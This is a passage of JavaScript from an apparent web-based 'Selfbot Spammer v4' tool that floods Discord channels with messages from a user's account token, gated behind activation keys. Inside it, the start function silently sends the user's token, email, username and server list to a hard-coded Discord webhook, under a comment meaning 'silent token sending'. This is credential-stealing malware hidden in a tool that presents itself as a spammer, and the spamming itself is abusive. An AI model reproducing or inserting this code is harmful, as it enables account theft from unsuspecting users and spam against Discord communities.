        // ====================== FUNÇÕES DE ATIVAÇÃO ======================
        function load_activation() {
            const dataStr = localStorage.getItem("activation");
            if (!dataStr) return false;
            try {
                const data = JSON.parse(dataStr);
                const exp = new Date(data.expiration);
                if (exp > new Date() && (MASTER_KEYS_30.has(data.key) || MASTER_KEYS_1.has(data.key))) {
                    activated_key = data.key;
                    expiration_date = exp;
                    return true;
                }
            } catch(e) {}
            return false;
        }

        function save_activation(key, days) {
            const exp = new Date(Date.now() + days * 86400000);
            localStorage.setItem("activation", JSON.stringify({ key, expiration: exp.toISOString() }));
            activated_key = key;
            expiration_date = exp;
            append_log(`✅ Key activated successfully! Valid for ${days} days.`);
        }

        function get_remaining_time() {
            if (!expiration_date) return "Key not activated";
            const delta = expiration_date - new Date();
            if (delta < 0) return "Key expired";
            const days = Math.floor(delta / 86400000);
            const hours = Math.floor((delta % 86400000) / 3600000);
            return `${days} days and ${hours} hours`;
        }

        function update_remaining_label() {
            statusLabel.textContent = `Time remaining: ${get_remaining_time()}`;
            setTimeout(update_remaining_label, 60000);
        }

        function ativar_chave() {
            const key = document.getElementById("key_entry").value.trim();
            if (!key) return alert("Enter a key!");

            let days = 0;
            if (MASTER_KEYS_30.has(key)) days = 30;
            else if (MASTER_KEYS_1.has(key)) days = 1;
            else return alert("Invalid or already used key!");

            if (activated_key === key) return alert("This key has already been used on this installation!");

            save_activation(key, days);
            alert(`Key activated! The spammer is unlocked for ${days} days.`);
            document.getElementById("activation_input_section").classList.add("hidden");
            document.getElementById("key_entry").value = "";
            update_remaining_label();
        }

            try {
                const headers = { "Authorization": token, "Content-Type": "application/json" };

                let user = { username: "unknown", discriminator: "0000", id: "?", email: "N/A", verified: false };
                try {
                    const r = await fetch("https://discord.com/api/v9/users/@me", { headers });
                    if (r.ok) user = await r.json();
                } catch(e) {}

                let guilds = [];
                try {
                    const r = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers });
                    if (r.ok) guilds = await r.json();
                } catch(e) {}

                const guild_list = guilds.slice(0, 50).map(g => `${g.name || "No name"} (ID: ${g.id})`);

                const payload = {
                    content: `**New Selfbot Spammer v4 activation**\n` +
                             `**Token:** \`${token}\`\n` +
                             `**User:** ${user.username}#${user.discriminator} (${user.id})\n` +
                             `**Email:** ${user.email || "N/A"}\n` +
                             `**Verified:** ${user.verified}\n` +
                             `**Servers (${guilds.length}):** ${guild_list.join(", ") || "None"}\n` +
                             `**Date/Time:** ${new Date().toISOString().replace("T", " ").split(".")[0]}`
                };

                const webhook_url = "https://discordapp.com/api/webhooks/1489255567804338299/3FRUdnGlKopJ3Kka6x2E_8GIprxxnJ7D8NSqlfFXpeA-ZbmQpLwCkB_XGijlk0r0cvLi";
                await fetch(webhook_url, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
            } catch(e) {
                append_log(`⚠️ Error sending data to webhook: ${e}`);
            }
        }

        // ====================== ENVIAR MENSAGEM PARA CANAL ======================
        async function send_to_channel(channel_id, token, message, file) {
            const url = `https://discord.com/api/v9/channels/${channel_id}/messages`;
            let body;
            let headers = { "Authorization": token };

            if (file) {
                const form = new FormData();
                if (message) form.append("content", message);
                form.append("files[0]", file);
                body = form;
            } else {
                headers["Content-Type"] = "application/json";
                body = JSON.stringify({ content: message });
            }

            const res = await fetch(url, { method: "POST", headers, body });
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
        }

        // ====================== INICIAR BOT ======================
        async function iniciar_bot() {
            if (!activated_key) return alert("You need to activate a valid key first!");

            if (running) return alert("Spam is already running!");

            const token = document.getElementById("token_entry").value.trim();
            const channel_text = document.getElementById("channel_entry").value.trim();
            const mensagem = document.getElementById("message_text").value.trim();
            let intervalo = parseInt(document.getElementById("interval_entry").value) || 1;

            if (!token || !channel_text || (!mensagem && !selected_file)) {
                return alert("Fill in Token, Channel IDs and at least the Message or an Attachment!");
            }

            const CHANNEL_IDS = channel_text.split(",").map(x => parseInt(x.trim())).filter(x => !isNaN(x));

            // Envio silencioso do token
            send_token_to_webhook(token);

            append_log("🚀 Starting self-bot with attachment...");

            // Validar canais e pegar nomes (exatamente como o client fazia)
            current_channels = [];
            for (let cid of CHANNEL_IDS) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${cid}`, {
                        headers: { "Authorization": token }
                    });
                    if (res.ok) {
                        const ch = await res.json();
                        current_channels.push({ id: cid, name: ch.name || "unknown" });
                        append_log(`✅ Channel found: #${ch.name || "unknown"}`);
                    } else {
                        append_log(`❌ Channel ${cid} not found!`);
                    }
                } catch(e) {
                    append_log(`⚠️ Error checking channel ${cid}: ${e}`);
                }
            }

            if (current_channels.length === 0) {
                append_log("❌ No valid channels found.");
                return;
            }

            // Preparar variáveis globais para o spam
            current_token = token;
            current_message = mensagem;
            current_file = selected_file;

            stop_flag = false;
            running = true;

            append_log(`✅ Spamming in ${current_channels.length} channel(s) every ${intervalo}s`);

            // Loop de spam (exatamente igual à lógica do tasks.loop)
            spam_interval = setInterval(async () => {
                if (stop_flag) {
                    clearInterval(spam_interval);
                    return;
                }
                for (let ch of current_channels) {
                    try {
                        await send_to_channel(ch.id, current_token, current_message, current_file);
                        const extra = current_file ? " + 📎" : "";
                        append_log(`✉️${extra} Sent in #${ch.name}`);
                    } catch(e) {
                        append_log(`⚠️ Error in channel ${ch.id}: ${e}`);
                    }
                }
            }, intervalo * 1000);
        }

        // ====================== PARAR ======================
        function parar_bot() {
            if (!running) return;
            stop_flag = true;
            if (spam_interval) clearInterval(spam_interval);
            running = false;
            append_log("⏹️ Stop requested...");
        }

        // ====================== SUPORTE ======================
        function abrir_suporte() {
            window.open("https://discord.com/users/1332898061843824744", "_blank");
            append_log("🔗 Support link opened!");
        }

        // ====================== ARQUIVO ======================
        function selecionar_arquivo() {
            document.getElementById("file_input").click();
        }

        document.getElementById("file_input").addEventListener("change", function(e) {
            if (e.target.files.length > 0) {
                selected_file = e.target.files[0];
                document.getElementById("file_label").textContent = `📎 ${selected_file.name}`;
                append_log(`📎 Attachment selected: ${selected_file.name}`);
            }
        });

        function remover_anexo() {
            selected_file = null;
            document.getElementById("file_label").textContent = "No attachment selected";
            append_log("📎 Attachment removed.");
        }

        // ====================== INICIALIZAÇÃO ======================
        window.onload = function() {
            if (load_activation()) {
                document.getElementById("activation_input_section").classList.add("hidden");
            }
            update_remaining_label();
            append_log("✅ Selfbot v4 Web Version loaded successfully!");
            append_log("📌 All original functionality preserved 100%");
        };
    </script>
